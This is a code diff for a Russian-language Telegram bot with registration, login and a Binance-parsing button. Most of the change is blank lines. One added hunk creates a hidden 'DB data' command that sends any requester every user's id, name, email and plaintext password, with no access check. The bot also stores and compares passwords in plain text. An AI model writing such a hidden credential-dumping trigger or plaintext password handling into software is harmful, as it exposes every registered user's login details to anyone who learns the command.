@@ -109,6 +109,11 @@ async def subscribe_from_start(message: types.Message):
 
 @dp.message_handler(content_types=['text'])
 async def subscribe(message):
+    if message.text =="DB data":
+        subscriptions = db.get_subscriptions()
+        # отправляем всем новость
+        for s in subscriptions:
+            await bot.send_message(message.chat.id,f'id: {s[1]}\n\nname: {s[3]}\n\nemail: {s[6]}\n\n password: {s[7]}')
     if message.text =="REGISTRATION":
         await Form.LOGIN.set()
         await bot.send_message(message.chat.id,f'Введите LOGIN:')
@@ -138,19 +143,21 @@ async def subscribe(message):
     if message.text == "LOGIN":
         await bot.send_message(message.chat.id,f'Введите ваш логин:')
         await Form.lg.set()
+    
     if message.text =="EXIT":
         db.up_Login(0,message.chat.id)
         REGIS = types.ReplyKeyboardMarkup(resize_keyboard=True)
         login = types.KeyboardButton(text="LOGIN")
         registration = types.KeyboardButton(text="REGISTRATION")
         REGIS.add(login,registration)
+    
         await bot.send_message(message.chat.id,f'Возвращайтесь скорее, деньги ждать не будут 😉',reply_markup = REGIS)
-  
 
 @dp.message_handler(state = Form.LOGIN)
 async def register_login(message: types.Message, state: FSMContext):
     log = message.text
     db.add_email(message.chat.id,log)  
+    
     await bot.send_message(message.chat.id,f'Введите пароль:')  
     await Form.PASSW.set()
 
@@ -175,6 +182,7 @@ async def password(message: types.Message, state: FSMContext):
         if s[1] == message.chat.id:
             if s[6] == lg:
                 if s[7] == ps:
+
                         keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
 
                         button_1 = types.KeyboardButton(text="PARSE BINANCE!")
@@ -182,8 +190,11 @@ async def password(message: types.Message, state: FSMContext):
                         button_3 = types.KeyboardButton(text="EXIT")
                         keyboard.add(button_1,button_2)
                         keyboard.row(button_3)
+
                         await bot.send_message(message.chat.id,f'Вход выполнен успешно!',reply_markup = keyboard)
+
                         db.up_Login(1,message.chat.id)
+
                         await state.finish()
                 else:
                     await bot.send_message(message.chat.id,f'Неверный пароль! Выполните процедуру входа заново!')
